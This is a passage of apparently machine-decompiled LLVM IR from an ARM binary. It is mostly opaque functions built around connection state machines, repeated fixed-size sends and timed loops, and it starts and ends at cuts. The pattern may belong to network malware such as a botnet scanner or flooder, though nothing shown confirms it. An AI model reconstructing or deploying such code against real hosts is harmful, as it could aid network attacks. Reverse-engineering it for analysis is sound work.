  %v1_f878 = call i32 @function_8648(i32 %v2_f870)
  %v2_f880 = icmp eq i32 %v1_f878, 0
  %v2_f8d0 = add i32 %v2_eb40, 8
  store i32 %v2_f8d0, i32* %r2.global-to-local, align 4
  br i1 %v2_f880, label %dec_label_pc_f8b4, label %dec_label_pc_f888

dec_label_pc_f888:                                ; preds = %dec_label_pc_f850
  %v3_f8ac = inttoptr i32 %v2_f8d0 to i8*
  store i8 0, i8* %v3_f8ac, align 4
  br label %dec_label_pc_fff0

dec_label_pc_f8b4:                                ; preds = %dec_label_pc_f850
  %v3_f8d8 = inttoptr i32 %v2_f8d0 to i8*
  store i8 5, i8* %v3_f8d8, align 4
  br label %dec_label_pc_fff0

dec_label_pc_f8e0:                                ; preds = %dec_label_pc_f7e8
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_f900 = load i32, i32* %v1_eb48, align 4
  %v1_f904 = add i32 %v2_f900, 6
  store i32 %v1_f904, i32* @r4, align 4
  %v2_f90c = call i32 @function_1265c(i32* null)
  %v0_f914 = load i32, i32* @r4, align 4
  %v3_f914 = icmp ult i32 %v0_f914, %v2_f90c
  br i1 %v3_f914, label %dec_label_pc_f91c, label %dec_label_pc_fff0

dec_label_pc_f91c:                                ; preds = %dec_label_pc_f8e0
  %v2_f938 = add i32 %v2_eb40, 8
  %v3_f940 = inttoptr i32 %v2_f938 to i8*
  store i8 0, i8* %v3_f940, align 4
  store i32 %v2_f938, i32* %r2.global-to-local, align 4
  %v3_f968 = add i32 %v2_eb40, 9
  %v4_f968 = inttoptr i32 %v3_f968 to i8*
  store i8 1, i8* %v4_f968, align 1
  br label %dec_label_pc_fff0

dec_label_pc_f970:                                ; preds = %dec_label_pc_eb8c
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v1_f988 = inttoptr i32 %v2_eb40 to i32*
  %v2_f988 = load i32, i32* %v1_f988, align 4
  store i32 %v2_f988, i32* @r4, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_f9a8 = add i32 %v2_eb40, 8
  %v1_f9ac = add i32 %v2_eb40, 11
  %v2_f9ac = inttoptr i32 %v1_f9ac to i8*
  %v3_f9ac = load i8, i8* %v2_f9ac, align 1
  %v4_f9ac = zext i8 %v3_f9ac to i32
  store i32 %v4_f9ac, i32* %r2.global-to-local, align 4
  %v4_f9b8 = mul nuw nsw i32 %v4_f9ac, 4
  %v5_f9b8 = add nuw nsw i32 %v4_f9b8, 180640
  %v6_f9b8 = inttoptr i32 %v5_f9b8 to i32*
  %v7_f9b8 = load i32, i32* %v6_f9b8, align 4
  store i32 %v7_f9b8, i32* @r5, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v3_f9dc = load i8, i8* %v2_f9ac, align 1
  %v4_f9dc = zext i8 %v3_f9dc to i32
  store i32 %v4_f9dc, i32* %r2.global-to-local, align 4
  %v4_f9e8 = mul nuw nsw i32 %v4_f9dc, 4
  %v5_f9e8 = add nuw nsw i32 %v4_f9e8, 180640
  %v6_f9e8 = inttoptr i32 %v5_f9e8 to i32*
  %v7_f9e8 = load i32, i32* %v6_f9e8, align 4
  store i32 %v7_f9e8, i32* @r0, align 4
  %v0_f9f0 = call i32 @function_13f70()
  %v0_f9f8 = load i32, i32* @r4, align 4
  %v0_f9fc = load i32, i32* @r5, align 4
  store i32 %v0_f9f0, i32* %r2.global-to-local, align 4
  %v4_fa08 = call i32 @function_149c8(i32 %v0_f9f8, i32 %v0_f9fc, i32 %v0_f9f0, i32 16384)
  %v1_fa10 = icmp slt i32 %v4_fa08, 0
  br i1 %v1_fa10, label %dec_label_pc_fa18, label %dec_label_pc_fa6c

dec_label_pc_fa18:                                ; preds = %dec_label_pc_f970
  %v3_fa3c = inttoptr i32 %v2_f9a8 to i8*
  store i8 0, i8* %v3_fa3c, align 4
  store i32 %v2_f9a8, i32* %r2.global-to-local, align 4
  %v3_fa64 = add i32 %v2_eb40, 9
  %v4_fa64 = inttoptr i32 %v3_fa64 to i8*
  store i8 1, i8* %v4_fa64, align 1
  br label %dec_label_pc_fff0

dec_label_pc_fa6c:                                ; preds = %dec_label_pc_f970
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_fa84 = load i32, i32* %v1_f988, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_fa98 = call i32 @function_149c8(i32 %v2_fa84, i32 ptrtoint ([3 x i8]* @global_var_221fc.558 to i32), i32 2, i32 16384)
  %v1_faa0 = icmp slt i32 %v5_fa98, 0
  store i32 %v2_f9a8, i32* %r2.global-to-local, align 4
  br i1 %v1_faa0, label %dec_label_pc_faa8, label %dec_label_pc_fafc

dec_label_pc_faa8:                                ; preds = %dec_label_pc_fa6c
  %v3_facc = inttoptr i32 %v2_f9a8 to i8*
  store i8 0, i8* %v3_facc, align 4
  store i32 %v2_f9a8, i32* %r2.global-to-local, align 4
  %v3_faf4 = add i32 %v2_eb40, 9
  %v4_faf4 = inttoptr i32 %v3_faf4 to i8*
  store i8 1, i8* %v4_faf4, align 1
  br label %dec_label_pc_fff0

dec_label_pc_fafc:                                ; preds = %dec_label_pc_fa6c
  %v3_fb20 = inttoptr i32 %v2_f9a8 to i8*
  store i8 6, i8* %v3_fb20, align 4
  br label %dec_label_pc_fff0

dec_label_pc_fb28:                                ; preds = %dec_label_pc_eb8c
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v1_fb40 = inttoptr i32 %v2_eb40 to i32*
  %v2_fb40 = load i32, i32* %v1_fb40, align 4
  store i32 %v2_fb40, i32* %ip.global-to-local, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_fb60 = add i32 %v2_eb3c, %v2_f328
  %v1_fb64 = inttoptr i32 %v2_fb60 to i32*
  %v2_fb64 = load i32, i32* %v1_fb64, align 4
  store i32 %v2_fb64, i32* %r2.global-to-local, align 4
  %v1_fb6c = load i32, i32* @sp, align 4
  %v2_fb6c = inttoptr i32 %v1_fb6c to i32*
  store i32 180476, i32* %v2_fb6c, align 4
  %v0_fb70 = load i32, i32* %ip.global-to-local, align 4
  %v4_fb80 = inttoptr i32 %v2_fb64 to i8*
  %v5_fb80 = call i32 @function_8810(i32 %v0_fb70, i32 10000, i8* %v4_fb80, i32 512)
  %v2_fb88 = icmp eq i32 %v5_fb80, 0
  br i1 %v2_fb88, label %dec_label_pc_fcfc, label %dec_label_pc_fb90

dec_label_pc_fb90:                                ; preds = %dec_label_pc_fb28
  store i32 %storemerge511, i32* @r4, align 4
  %v2_fb98 = call i32 @function_1265c(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_fbac = load i32, i32* @r4, align 4
  %v2_fbb8 = mul i32 %v0_fbac, 28
  %v2_fbc0 = add i32 %v2_fd14, %v2_fbb8
  %v2_fbc4 = inttoptr i32 %v2_fbc0 to i32*
  store i32 %v2_fb98, i32* %v2_fbc4, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_fbe8 = load i32, i32* %v1_fb64, align 4
  %v1_fbf0 = call i32 @function_8648(i32 %v2_fbe8)
  %v2_fbf8 = icmp eq i32 %v1_fbf0, 0
  br i1 %v2_fbf8, label %dec_label_pc_fc2c, label %dec_label_pc_fc00

dec_label_pc_fc00:                                ; preds = %dec_label_pc_fb90
  %v2_fc1c = add i32 %v2_eb40, 8
  store i32 %v2_fc1c, i32* %r2.global-to-local, align 4
  %v3_fc24 = inttoptr i32 %v2_fc1c to i8*
  store i8 0, i8* %v3_fc24, align 4
  br label %dec_label_pc_fff0

dec_label_pc_fc2c:                                ; preds = %dec_label_pc_fb90
  %v2_fc30 = load i32, i32* @global_var_2c890.36, align 4
  store i32 %v2_fc30, i32* @r4, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v3_fc50 = call i32 @function_88c0(i32 %v2_eb40, i32 %v3_ea44, i32 %v3_eb34)
  store i32 %v3_fc50, i32* %ip.global-to-local, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_fc74 = add i32 %v2_eb40, 8
  %v1_fc78 = add i32 %v2_eb40, 10
  %v2_fc78 = inttoptr i32 %v1_fc78 to i8*
  %v3_fc78 = load i8, i8* %v2_fc78, align 2
  %v4_fc78 = zext i8 %v3_fc78 to i32
  store i32 %v4_fc78, i32* %r2.global-to-local, align 4
  %v4_fc84 = mul nuw nsw i32 %v4_fc78, 4
  %v5_fc84 = add nuw nsw i32 %v4_fc84, 180584
  %v6_fc84 = inttoptr i32 %v5_fc84 to i32*
  %v7_fc84 = load i32, i32* %v6_fc84, align 4
  store i32 %v7_fc84, i32* @lr, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v1_fca8 = add i32 %v2_eb40, 11
  %v2_fca8 = inttoptr i32 %v1_fca8 to i8*
  %v3_fca8 = load i8, i8* %v2_fca8, align 1
  %v4_fca8 = zext i8 %v3_fca8 to i32
  store i32 %v4_fca8, i32* %r2.global-to-local, align 4
  %v4_fcb4 = mul nuw nsw i32 %v4_fca8, 4
  %v5_fcb4 = add nuw nsw i32 %v4_fcb4, 180640
  %v6_fcb4 = inttoptr i32 %v5_fcb4 to i32*
  %v7_fcb4 = load i32, i32* %v6_fcb4, align 4
  %v1_fcb8 = load i32, i32* @sp, align 4
  %v2_fcb8 = inttoptr i32 %v1_fcb8 to i32*
  store i32 %v7_fcb4, i32* %v2_fcb8, align 4
  %v0_fcbc = load i32, i32* @r4, align 4
  %v0_fcc4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_fcc4, i32* @r2, align 4
  %v2_fccc = call i32 @function_9340(i32 %v0_fcbc, i32 ptrtoint (i32* @global_var_22200.563 to i32))
  store i32 %v2_fc74, i32* %r2.global-to-local, align 4
  %v3_fcf4 = inttoptr i32 %v2_fc74 to i8*
  store i8 7, i8* %v3_fcf4, align 4
  br label %dec_label_pc_fff0

dec_label_pc_fcfc:                                ; preds = %dec_label_pc_fb28
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_fd18 = add i32 %v2_eb3c, %v2_fd14
  %v1_fd1c = inttoptr i32 %v2_fd18 to i32*
  %v2_fd1c = load i32, i32* %v1_fd1c, align 4
  %v1_fd20 = add i32 %v2_fd1c, 7
  store i32 %v1_fd20, i32* @r4, align 4
  %v2_fd28 = call i32 @function_1265c(i32* null)
  %v0_fd30 = load i32, i32* @r4, align 4
  %v3_fd30 = icmp ult i32 %v0_fd30, %v2_fd28
  br i1 %v3_fd30, label %dec_label_pc_fd38, label %dec_label_pc_fff0

dec_label_pc_fd38:                                ; preds = %dec_label_pc_fcfc
  %v2_fd54 = add i32 %v2_eb40, 8
  %v3_fd5c = inttoptr i32 %v2_fd54 to i8*
  store i8 0, i8* %v3_fd5c, align 4
  store i32 %v2_fd54, i32* %r2.global-to-local, align 4
  %v3_fd84 = add i32 %v2_eb40, 9
  %v4_fd84 = inttoptr i32 %v3_fd84 to i8*
  store i8 1, i8* %v4_fd84, align 1
  br label %dec_label_pc_fff0

dec_label_pc_fd8c:                                ; preds = %dec_label_pc_eb8c
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v1_fda4 = inttoptr i32 %v2_eb40 to i32*
  %v2_fda4 = load i32, i32* %v1_fda4, align 4
  store i32 425, i32* %r2.global-to-local, align 4
  %v5_fdbc = call i32 @function_149c8(i32 %v2_fda4, i32 ptrtoint ([485 x i8]* @global_var_22240.565 to i32), i32 425, i32 16384)
  %v1_fdc4 = icmp slt i32 %v5_fdbc, 0
  %v2_fde8 = add i32 %v2_eb40, 8
  store i32 %v2_fde8, i32* %r2.global-to-local, align 4
  br i1 %v1_fdc4, label %dec_label_pc_fdcc, label %dec_label_pc_fe20

dec_label_pc_fdcc:                                ; preds = %dec_label_pc_fd8c
  %v3_fdf0 = inttoptr i32 %v2_fde8 to i8*
  store i8 0, i8* %v3_fdf0, align 4
  store i32 %v2_fde8, i32* %r2.global-to-local, align 4
  %v3_fe18 = add i32 %v2_eb40, 9
  %v4_fe18 = inttoptr i32 %v3_fe18 to i8*
  store i8 1, i8* %v4_fe18, align 1
  br label %dec_label_pc_fff0

dec_label_pc_fe20:                                ; preds = %dec_label_pc_fd8c
  %v3_fe44 = inttoptr i32 %v2_fde8 to i8*
  store i8 8, i8* %v3_fe44, align 4
  br label %dec_label_pc_fff0

dec_label_pc_fe4c:                                ; preds = %dec_label_pc_eb8c
  store i32 %storemerge511, i32* @r4, align 4
  %v2_fe54 = call i32 @function_1265c(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_fe68 = load i32, i32* @r4, align 4
  %v2_fe74 = mul i32 %v0_fe68, 28
  %v2_fe7c = add i32 %v2_fd14, %v2_fe74
  %v2_fe80 = inttoptr i32 %v2_fe7c to i32*
  store i32 %v2_fe54, i32* %v2_fe80, align 4
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v1_fe9c = inttoptr i32 %v2_eb40 to i32*
  %v2_fe9c = load i32, i32* %v1_fe9c, align 4
  store i32 425, i32* %r2.global-to-local, align 4
  %v5_feb4 = call i32 @function_149c8(i32 %v2_fe9c, i32 ptrtoint ([485 x i8]* @global_var_22240.565 to i32), i32 425, i32 16384)
  %v1_febc = icmp slt i32 %v5_feb4, 0
  br i1 %v1_febc, label %dec_label_pc_fec4, label %dec_label_pc_ff3c

dec_label_pc_fec4:                                ; preds = %dec_label_pc_fe4c
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_fedc = load i32, i32* %v1_fe9c, align 4
  %v3_fee4 = call i32 @function_e908(i32 %v2_fedc, i32 %v3_ea44, i32 %v3_eb34)
  %v2_ff04 = add i32 %v2_eb40, 8
  %v3_ff0c = inttoptr i32 %v2_ff04 to i8*
  store i8 0, i8* %v3_ff0c, align 4
  store i32 %v2_ff04, i32* %r2.global-to-local, align 4
  %v3_ff34 = add i32 %v2_eb40, 9
  %v4_ff34 = inttoptr i32 %v3_ff34 to i8*
  store i8 1, i8* %v4_ff34, align 1
  br label %dec_label_pc_fff0

dec_label_pc_ff3c:                                ; preds = %dec_label_pc_fe4c
  %v2_ff58 = add i32 %v2_eb40, 8
  %v3_ff60 = add i32 %v2_eb40, 9
  %v4_ff60 = inttoptr i32 %v3_ff60 to i8*
  store i8 3, i8* %v4_ff60, align 1
  store i32 %v3_eb34, i32* %r2.global-to-local, align 4
  %v2_ff80 = add i32 %v2_eb3c, %v2_fd14
  %v1_ff84 = inttoptr i32 %v2_ff80 to i32*
  %v2_ff84 = load i32, i32* %v1_ff84, align 4
  %v1_ff88 = add i32 %v2_ff84, 60
  store i32 %v1_ff88, i32* @r4, align 4
  %v2_ff90 = call i32 @function_1265c(i32* null)
  %v0_ff98 = load i32, i32* @r4, align 4
  %v3_ff98 = icmp ult i32 %v0_ff98, %v2_ff90
  br i1 %v3_ff98, label %dec_label_pc_ffa0, label %dec_label_pc_fff0

dec_label_pc_ffa0:                                ; preds = %dec_label_pc_ff3c
  %v3_ffc4 = inttoptr i32 %v2_ff58 to i8*
  store i8 0, i8* %v3_ffc4, align 4
  store i32 %v2_ff58, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v4_ff60, align 1
  br label %dec_label_pc_fff0

dec_label_pc_fff0:                                ; preds = %dec_label_pc_f3f4, %dec_label_pc_f5a0, %dec_label_pc_f8e0, %dec_label_pc_fcfc, %dec_label_pc_ff3c, %dec_label_pc_eb8c, %dec_label_pc_ee44, %dec_label_pc_f768, %dec_label_pc_f6d8, %dec_label_pc_f5dc, %dec_label_pc_f574, %dec_label_pc_f548, %dec_label_pc_f430, %dec_label_pc_f37c, %dec_label_pc_f260, %dec_label_pc_f1e8, %dec_label_pc_f00c, %dec_label_pc_efbc, %dec_label_pc_ee18, %dec_label_pc_edc0, %dec_label_pc_fec4, %dec_label_pc_fe20, %dec_label_pc_fdcc, %dec_label_pc_fd38, %dec_label_pc_fc2c, %dec_label_pc_fc00, %dec_label_pc_fafc, %dec_label_pc_faa8, %dec_label_pc_fa18, %dec_label_pc_f91c, %dec_label_pc_f8b4, %dec_label_pc_f888, %dec_label_pc_f7bc, %dec_label_pc_ffa0
  %v1_fff4 = add nuw nsw i32 %storemerge511, 1
  %v5_10008 = icmp slt i32 %v1_fff4, 512
  br i1 %v5_10008, label %dec_label_pc_eb28, label %dec_label_pc_eb1c

; uselistorder directives
  uselistorder i32 %v2_fde8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_fc74, { 1, 0 }
  uselistorder i32 %v0_f9f0, { 1, 0 }
  uselistorder i32 %v2_f9a8, { 5, 2, 4, 3, 0, 1 }
  uselistorder i32 %v2_f8d0, { 1, 0, 2 }
  uselistorder i32 %v0_f6b0, { 1, 0 }
  uselistorder i32 %v2_f668, { 5, 2, 4, 3, 0, 1 }
  uselistorder i32 %v2_f590, { 1, 0, 2 }
  uselistorder i32 %v2_f278, { 1, 0 }
  uselistorder i32* %v1_f0b4, { 4, 3, 0, 1, 2, 5, 6, 7 }
  uselistorder i32 %storemerge610, { 1, 0 }
  uselistorder i32 %v0_ec98, { 1, 0 }
  uselistorder i32 %v2_ec2c, { 1, 0 }
  uselistorder i32 %v2_ec28, { 1, 0, 2 }
  uselistorder i8* %v2_ec00, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_eb70, { 1, 0 }
  uselistorder i32* %v1_eb48, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_eb40, { 5, 6, 50, 51, 52, 47, 48, 49, 39, 40, 41, 43, 42, 44, 45, 46, 35, 34, 37, 36, 38, 30, 31, 32, 4, 33, 26, 25, 28, 27, 29, 21, 22, 23, 3, 24, 18, 19, 16, 17, 12, 13, 14, 15, 20, 8, 1, 2, 9, 0, 11, 10, 7 }
  uselistorder i32 %v2_eb3c, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v3_eb34, { 57, 55, 56, 54, 53, 47, 52, 51, 49, 50, 48, 46, 45, 44, 43, 42, 41, 39, 40, 38, 37, 36, 35, 34, 33, 31, 32, 30, 29, 27, 28, 26, 24, 25, 23, 22, 20, 21, 19, 18, 17, 16, 9, 10, 8, 7, 6, 5, 4, 15, 14, 13, 12, 11, 3, 2, 1, 0 }
  uselistorder i32 %storemerge511, { 1, 4, 5, 7, 6, 3, 2, 0 }
  uselistorder i32 %v2_fd14, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v2_f060, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v1_eb04, { 1, 0, 2 }
  uselistorder i32 %storemerge413, { 1, 0 }
  uselistorder i32 %v3_ea44, { 3, 4, 7, 6, 5, 9, 0, 10, 8, 1, 13, 14, 15, 12, 2, 11 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-612, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 112, 71 }
  uselistorder i32* %ip.global-to-local, { 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 ptrtoint ([485 x i8]* @global_var_22240.565 to i32), { 1, 0 }
  uselistorder i32 425, { 1, 3, 0, 2 }
  uselistorder i32 180640, { 2, 0, 1 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_221fc.558 to i32), { 1, 0 }
  uselistorder i32 180584, { 2, 0, 1 }
  uselistorder i32 (i32)* @function_8648, { 2, 1, 3, 0 }
  uselistorder i32 (i32, i32, i8*, i32)* @function_8810, { 1, 2, 0 }
  uselistorder i32 10000, { 2, 1, 0 }
  uselistorder i32 180456, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_1494c, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_12764, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_e908, { 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_fff0, { 33, 4, 20, 21, 22, 23, 3, 24, 25, 26, 27, 28, 29, 2, 30, 31, 32, 7, 8, 9, 1, 10, 11, 12, 0, 13, 14, 15, 16, 17, 6, 18, 19, 5 }
  uselistorder label %dec_label_pc_f074, { 1, 0 }
  uselistorder label %dec_label_pc_f00c, { 1, 0 }
  uselistorder label %dec_label_pc_eb8c, { 1, 0 }
  uselistorder label %dec_label_pc_eb28, { 1, 0 }
  uselistorder label %dec_label_pc_ea88, { 1, 0 }
}

define i32 @function_10010(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10010:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_10010 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10010, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_10010
  %v2_10010 = load i32, i32* @r8, align 4
  %v3_10014 = udiv i32 %v2_10010, 4
  %v4_10014 = mul i32 %v2_10010, 1073741824
  %v5_10014 = or i32 %v3_10014, %v4_10014
  %v8_10014 = and i32 %v5_10014, %tmp
  store i32 %v8_10014, i32* %ip.global-to-local, align 4
  store i32 %tmp, i32* %arg2, align 4
  %v6_10018 = load i32, i32* %r2.global-to-local, align 4
  %v7_10018 = sub i32 %v6_10018, %v8_10014
  store i32 %v7_10018, i32* %r2.global-to-local, align 4
  %v5_1001c = udiv i32 %arg1, 8
  %v6_1001c = and i32 %v7_10018, %v5_1001c
  store i32 %v6_1001c, i32* %ip.global-to-local, align 4
  %v4_10020 = inttoptr i32 %v7_10018 to i32*
  store i32 %v6_1001c, i32* %v4_10020, align 4
  %v5_10020 = load i32, i32* %ip.global-to-local, align 4
  %v6_10020 = load i32, i32* %r2.global-to-local, align 4
  %v7_10020 = sub i32 %v6_10020, %v5_10020
  store i32 %v7_10020, i32* %r2.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_10010, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v7_10018, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @function_10030(i32 %arg1) local_unnamed_addr {
dec_label_pc_10030:
  %stack_var_-100 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_10030 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_10030, i32* @ip, align 4
  %v2_1004c = ptrtoint i32* %stack_var_-100 to i32
  %v2_10078 = bitcast i32* %stack_var_-100 to i8*
  br label %dec_label_pc_10040

dec_label_pc_10040:                               ; preds = %dec_label_pc_100ec, %dec_label_pc_10030
  br label %dec_label_pc_1004c

dec_label_pc_1004c:                               ; preds = %dec_label_pc_10040, %dec_label_pc_1004c
  %storemerge12 = phi i32 [ 0, %dec_label_pc_10040 ], [ %v1_100d8, %dec_label_pc_1004c ]
  store i32 %v2_1004c, i32* @r3, align 4
  store i32 %v2_1004c, i32* @r0, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_22428.567 to i32), i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_1005c = call i32 @function_14000()
  %v4_10068 = mul nuw nsw i32 %storemerge12, 4
  %v5_10068 = add nuw nsw i32 %v4_10068, 181116
  %v6_10068 = inttoptr i32 %v5_10068 to i32*
  %v7_10068 = load i32, i32* %v6_10068, align 4
  store i32 %v7_10068, i32* @r1, align 4
  %v3_10078 = call i32 @function_141e8(i8* %v2_10078, i32 %v7_10068)
  %v1_10084 = call i32 @function_17180(i32 %v2_1004c)
  store i32 %v2_1004c, i32* @r3, align 4
  store i32 %v2_1004c, i32* @r0, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_22434.570 to i32), i32* @r1, align 4
  store i32 11, i32* @r2, align 4
  %v0_10098 = call i32 @function_14000()
  %v7_100a4 = load i32, i32* %v6_10068, align 4
  store i32 %v7_100a4, i32* @r1, align 4
  %v3_100b4 = call i32 @function_141e8(i8* %v2_10078, i32 %v7_100a4)
  store i32 ptrtoint (i32* @global_var_22440.572 to i32), i32* @r1, align 4
  %v3_100c4 = call i32 @function_141e8(i8* %v2_10078, i32 ptrtoint (i32* @global_var_22440.572 to i32))
  %v1_100d0 = call i32 @function_17180(i32 %v2_1004c)
  %v1_100d8 = add nuw nsw i32 %storemerge12, 1
  %v7_100e8 = icmp slt i32 %v1_100d8, 9
  br i1 %v7_100e8, label %dec_label_pc_1004c, label %dec_label_pc_100ec

dec_label_pc_100ec:                               ; preds = %dec_label_pc_1004c
  %v1_100f0 = call i32 @function_164b0(i32 5)
  br label %dec_label_pc_10040

; uselistorder directives
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 (i32)* @function_17180, { 1, 0 }
  uselistorder label %dec_label_pc_1004c, { 1, 0 }
}

define i32 @function_10108(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10108:
  %stack_var_-560 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 65812, i32* %stack_var_-4, align 4
  %v2_10110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10110, i32* @fp, align 4
  %v2_1012c = ptrtoint i32* %stack_var_-24 to i32
  %v2_10148 = call i32 @function_1265c(i32* null)
  %v2_10154 = add i32 %v2_10148, %arg5
  %v6_1015c = call i32 @function_15bf4(i32 %v2_10148, i32 ptrtoint ([11 x i8]* @global_var_2244c.575 to i32), i32 %v2_10148, i32 %v2_10154, i32 ptrtoint (i32* @0 to i32))
  %v2_10170 = srem i32 %v6_1015c, 3
  %v3_10198 = mul nsw i32 %v2_10170, 4
  %v2_101a0 = add i32 %v2_1012c, -24
  %v2_101a4 = add i32 %v2_101a0, %v3_10198
  %v1_101a8 = inttoptr i32 %v2_101a4 to i32*
  %v2_101a8 = load i32, i32* %v1_101a8, align 4
  store i32 %v2_101a8, i32* @r4, align 4
  %v5_101ac = call i32 @function_15bf4(i32 %v2_10170, i32 %v2_1012c, i32 -24, i32 %v2_101a4, i32 %v2_10170)
  %v2_101f8 = ptrtoint i32* %stack_var_-560 to i32
  store i32 %v2_101f8, i32* @r0, align 4
  %v3_10214 = call i32 @function_12b40(i32 %v2_101f8, i32 ptrtoint ([62 x i8]* @global_var_2246c.584 to i32))
  store i32 %v3_10214, i32* @r0, align 4
  %v5_1030c36 = icmp sgt i32 %arg6, 0
  br i1 %v5_1030c36, label %dec_label_pc_10224, label %dec_label_pc_10310

dec_label_pc_10224:                               ; preds = %dec_label_pc_10108, %dec_label_pc_102f4
  %storemerge137 = phi i32 [ %v1_102f8, %dec_label_pc_102f4 ], [ 0, %dec_label_pc_10108 ]
  %v0_10224 = call i32 @function_126e0()
  store i32 %v0_10224, i32* @r0, align 4
  %v2_1022c = icmp eq i32 %v0_10224, 0
  br i1 %v2_1022c, label %dec_label_pc_102f4, label %dec_label_pc_102d4

dec_label_pc_10238:                               ; preds = %dec_label_pc_102d4
  %v4_10254 = call i32 @function_81ec(i32 %arg1, i16 %arg3)
  %v2_10264 = icmp eq i32 %v4_10254, 0
  br i1 %v2_10264, label %dec_label_pc_102d4, label %dec_label_pc_1026c

dec_label_pc_1026c:                               ; preds = %dec_label_pc_10238
  store i32 %v2_101f8, i32* @r0, align 4
  %v0_10274 = call i32 @function_13f70()
  %v2_10288 = call i32 @function_12978(i32 %v4_10254, i32 %v2_101f8)
  %v1_102a0 = call i32 @function_127d8(i32 %v4_10254)
  %v1_102a8 = call i32 @function_12a98(i32 %v4_10254)
  store i32 %v2_101f8, i32* @r0, align 4
  %v0_102b4 = call i32 @function_13f70()
  %v2_102c8 = call i32 @function_12978(i32 %v4_10254, i32 %v2_101f8)
  %v1_102d0 = call i32 @function_12a98(i32 %v4_10254)
  br label %dec_label_pc_102d4

dec_label_pc_102d4:                               ; preds = %dec_label_pc_10238, %dec_label_pc_1026c, %dec_label_pc_10224
  %v2_102d8 = call i32 @function_1265c(i32* null)
  %v5_102e8 = icmp slt i32 %v2_102d8, %v2_10154
  br i1 %v5_102e8, label %dec_label_pc_10238, label %dec_label_pc_102ec

dec_label_pc_102ec:                               ; preds = %dec_label_pc_102d4
  %v1_102f0 = call i32 @function_163f8(i32 1)
  store i32 %v1_102f0, i32* @r0, align 4
  br label %dec_label_pc_102f4

dec_label_pc_102f4:                               ; preds = %dec_label_pc_10224, %dec_label_pc_102ec
  %v1_103183 = phi i32 [ 0, %dec_label_pc_10224 ], [ %v1_102f0, %dec_label_pc_102ec ]
  %v1_102f8 = add nuw nsw i32 %storemerge137, 1
  %v5_1030c = icmp slt i32 %v1_102f8, %arg6
  br i1 %v5_1030c, label %dec_label_pc_10224, label %dec_label_pc_10310

dec_label_pc_10310:                               ; preds = %dec_label_pc_102f4, %dec_label_pc_10108
